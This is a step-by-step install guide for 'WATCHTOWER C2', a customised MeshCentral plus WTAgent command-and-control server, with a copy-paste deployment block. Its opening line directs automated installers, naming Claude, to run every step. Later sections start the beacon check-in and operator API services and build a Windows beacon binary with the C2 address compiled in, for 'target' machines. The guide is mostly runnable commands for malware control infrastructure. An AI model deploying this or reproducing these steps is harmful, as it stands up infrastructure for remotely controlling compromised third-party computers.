# WATCHTOWER C2 — Debian VPS Installation Guide

> **For automated installers (Claude or scripts):** Follow every step in order.
> All commands assume a fresh Debian 11/12 VPS with root or sudo access.
> Do not skip steps — each section has required prerequisites from the previous one.

---

## Architecture Overview

```
[Operator browser]
       │
       ▼
 Port 443  (HTTPS) ── MeshCentral (WATCHTOWER UI)
       │                  └── proxies /wtop/* → localhost:8443/op/*
       │
 Port 8443 (HTTPS) ── wt_c2_server.js (WTAgent C2)
       │                  ├── /wta/*   Agent check-ins (encrypted, no token)
       │                  └── /op/*    Operator REST API (Bearer token)
       │
 Port 80   (HTTP)  ── MeshCentral redirect to 443
```

**What gets installed where:**

| Path | Contents |
|------|----------|
| `/opt/watchtower_c2/` | Full repo — MeshCentral + WTAgent C2 server |
| `/opt/watchtower_c2/MeshCentral-master/` | Node.js C2 UI (WATCHTOWER-customized MeshCentral) |
| `/opt/watchtower_c2/WTAgent/` | WTAgent C2 server + build toolchain |
| `/opt/watchtower_c2/meshcentral-data/` | MeshCentral runtime data (certs, DB, config) |

---

## Step 1 — System dependencies

```bash
sudo apt-get update -y
sudo apt-get install -y \
    git \
    curl \
    openssl \
    mono-mcs \
    mono-complete \
    ca-certificates \
    gnupg
```

> `mono-mcs` and `mono-complete` are required to compile `WTAgent.exe` on Linux.
> If you skip them you can still run the C2 server, but you won't be able to build the agent on this host.

---

## Step 2 — Install Node.js LTS

```bash
curl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -
sudo apt-get install -y nodejs
node --version   # should print v20.x or higher
```

---

## Step 3 — Clone the repository

```bash
sudo git clone https://github.com/trulybad/watchtower.git /opt/watchtower_c2
sudo chown -R $USER:$USER /opt/watchtower_c2
cd /opt/watchtower_c2
```

---

## Step 4 — Install Node.js dependencies (MeshCentral)

```bash
cd /opt/watchtower_c2/MeshCentral-master
npm install --production
cd /opt/watchtower_c2
```

> This installs MeshCentral's npm packages into `MeshCentral-master/node_modules/`.
> Takes ~1–2 minutes on first run.

---

## Step 5 — Configure and start WATCHTOWER (MeshCentral)

The `start-watchtower.sh` script handles everything automatically:
- Detects your server's public/private IP
- Writes `meshcentral-data/config.json` with the correct `cert` IP
- Generates TLS certificates on first boot
- Starts MeshCentral on port 443

```bash
cd /opt/watchtower_c2
sudo bash start-watchtower.sh
```

> **Must run as root** — port 443 requires root on Linux.

On first boot MeshCentral generates self-signed TLS certs (takes ~15–30 seconds).
Watch the log to confirm it is ready:

```bash
tail -f /opt/watchtower_c2/watchtower.log
```

Wait until you see a line like:
```
MeshCentral HTTP server running on port 80.
MeshCentral HTTPS server running on port 443.
```

Then press `Ctrl+C` to stop following the log (the server keeps running in the background).

---

## Step 6 — Create the operator admin account

MeshCentral has `newAccounts: false` set — accounts must be created via CLI.

```bash
cd /opt/watchtower_c2/MeshCentral-master
node meshcentral.js --createaccount admin --pass 'ChangeMe123!' --email admin@watchtower.local --emailverified --siteadmin
```

> Replace `admin` and `ChangeMe123!` with your preferred username and a strong password.
> The `--siteadmin` flag grants full admin rights.

Verify it worked — the command exits with no output on success. If you see an error like
`Account already exists` the account was already created from a previous run.

---

## Step 7 — Start the WTAgent C2 server

The WTAgent C2 server (`wt_c2_server.js`) runs on port 8443 and handles agent check-ins
and the operator REST API. It must run alongside MeshCentral.

```bash
cd /opt/watchtower_c2/WTAgent
node wt_c2_server.js --port 8443 --key server.key --cert server.crt &
```

On first run it generates:
- `server.key` / `server.crt` — TLS certificate for port 8443
- `agent_unwrap.key` / `agent_unwrap_pub.pem` — RSA-2048 key pair for agent comms
- `wt_op_token.txt` — 64-char hex operator token (keep this secret)

Check that it started successfully:

```bash
tail -20 /opt/watchtower_c2/WTAgent/wt_c2.log
```

You should see:
```
[INFO] Operator token : <64-char hex>
[INFO] Token file     : .../wt_op_token.txt
[INFO] C2 server listening on port 8443
```

Save the operator token — you will need it in the UI:
```bash
cat /opt/watchtower_c2/WTAgent/wt_op_token.txt
```

---

## Step 8 — Verify ports are listening

```bash
ss -tlnp | grep -E '443|80|8443'
```

Expected output:
```
LISTEN  0  511  0.0.0.0:443    ...  node
LISTEN  0  511  0.0.0.0:80     ...  node
LISTEN  0  511  0.0.0.0:8443   ...  node
```

---

## Step 9 — Access the WATCHTOWER UI

Open a browser and go to:
```
https://<YOUR-SERVER-IP>
```

Accept the self-signed TLS certificate warning.

Log in with the admin credentials you created in Step 6.

You should see the WATCHTOWER-themed MeshCentral dashboard with the custom toolbar.

---

## Step 10 — Connect the WTAgent panel to the C2 server

The WTAgent panel talks to `wt_c2_server.js` through MeshCentral's built-in `/wtop/` proxy
(no need to expose port 8443 directly to the browser).

1. In the WATCHTOWER UI toolbar, click **⚡ WTAGENT**
2. Click **⚙ CFG**
3. Enter your **Operator Token** (from `wt_op_token.txt`)
4. Click **SAVE**

The panel polls `/op/agents` every 5 seconds. Once agents check in they appear here.

---

## Step 11 — Build the WTAgent beacon (optional — requires target Windows machine)

Build a beacon binary baked with your C2 server's address:

```bash
cd /opt/watchtower_c2/WTAgent
./build.sh --url https://<YOUR-SERVER-IP>:8443
```

Output: `bin/WTAgent.exe`

> Re-run `build.sh` any time the server IP or domain changes — the URL is compiled into the binary.

If Mono compilation fails, the patched source is saved to `src/WTAgent_patched.cs`.
Compile it on Windows:
```
csc /target:exe /platform:x64 /optimize+ /unsafe ^
    /r:System.Windows.Forms.dll /r:System.Drawing.dll ^
    /out:bin\WTAgent.exe src\WTAgent_patched.cs
```

---

## Running as a persistent service (optional but recommended)

Create systemd units so both processes survive reboots.

### MeshCentral service

```bash
sudo tee /etc/systemd/system/watchtower.service > /dev/null <<'EOF'
[Unit]
Description=WATCHTOWER C2 (MeshCentral)
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/watchtower_c2/MeshCentral-master
ExecStart=/usr/bin/node meshcentral.js
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable watchtower
sudo systemctl start watchtower
sudo systemctl status watchtower
```

### WTAgent C2 server service

```bash
sudo tee /etc/systemd/system/wtagent-c2.service > /dev/null <<'EOF'
[Unit]
Description=WTAgent C2 Server
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/watchtower_c2/WTAgent
ExecStart=/usr/bin/node wt_c2_server.js --port 8443 --key server.key --cert server.crt
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable wtagent-c2
sudo systemctl start wtagent-c2
sudo systemctl status wtagent-c2
```

---

## Firewall rules

If `ufw` is active, allow the required ports:

```bash
sudo ufw allow 22/tcp    # SSH — do this FIRST or you'll lock yourself out
sudo ufw allow 80/tcp    # HTTP redirect
sudo ufw allow 443/tcp   # WATCHTOWER UI (HTTPS)
sudo ufw allow 8443/tcp  # WTAgent C2 check-ins
sudo ufw enable
sudo ufw status
```

> Port 8443 only needs to be open to agent targets. If all agents are on an internal network
> you can restrict it: `sudo ufw allow from <AGENT_SUBNET> to any port 8443`

---

## Quick sanity-check commands

```bash
# Is MeshCentral running?
systemctl status watchtower

# Is the WTAgent C2 server running?
systemctl status wtagent-c2

# Recent MeshCentral logs
tail -50 /opt/watchtower_c2/watchtower.log

# Recent WTAgent C2 logs
tail -50 /opt/watchtower_c2/WTAgent/wt_c2.log

# Show operator token
cat /opt/watchtower_c2/WTAgent/wt_op_token.txt

# Test operator API directly
curl -sk https://localhost:8443/op/agents \
     -H "Authorization: Bearer $(cat /opt/watchtower_c2/WTAgent/wt_op_token.txt)"
```

---

## Summary — complete install (copy-paste block)

Run this on a fresh Debian 11/12 VPS as root:

```bash
# 1. Dependencies
apt-get update -y
apt-get install -y git curl openssl mono-mcs mono-complete ca-certificates gnupg

# 2. Node.js LTS
curl -fsSL https://deb.nodesource.com/setup_lts.x | bash -
apt-get install -y nodejs

# 3. Clone
git clone https://github.com/trulybad/watchtower.git /opt/watchtower_c2
cd /opt/watchtower_c2

# 4. npm install
cd MeshCentral-master && npm install --production && cd ..

# 5. Start MeshCentral (first boot — generates certs, waits ~30s)
bash start-watchtower.sh --no-start

# 6. Create admin account
cd MeshCentral-master
node meshcentral.js --createaccount admin --pass 'ChangeMe123!' \
    --email admin@watchtower.local --emailverified --siteadmin
cd ..

# 7. Install systemd services
tee /etc/systemd/system/watchtower.service > /dev/null <<'EOF'
[Unit]
Description=WATCHTOWER C2 (MeshCentral)
After=network.target
[Service]
Type=simple
WorkingDirectory=/opt/watchtower_c2/MeshCentral-master
ExecStart=/usr/bin/node meshcentral.js
Restart=on-failure
RestartSec=5
[Install]
WantedBy=multi-user.target
EOF

tee /etc/systemd/system/wtagent-c2.service > /dev/null <<'EOF'
[Unit]
Description=WTAgent C2 Server
After=network.target
[Service]
Type=simple
WorkingDirectory=/opt/watchtower_c2/WTAgent
ExecStart=/usr/bin/node wt_c2_server.js --port 8443 --key server.key --cert server.crt
Restart=on-failure
RestartSec=5
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable watchtower wtagent-c2
systemctl start watchtower wtagent-c2

# 8. Show operator token (save this)
echo "Operator token:" && cat /opt/watchtower_c2/WTAgent/wt_op_token.txt
```

After this completes:
- UI: `https://<server-ip>` — login with `admin` / `ChangeMe123!`
- WTAgent token: printed above — paste into the **⚡ WTAGENT → ⚙ CFG** panel
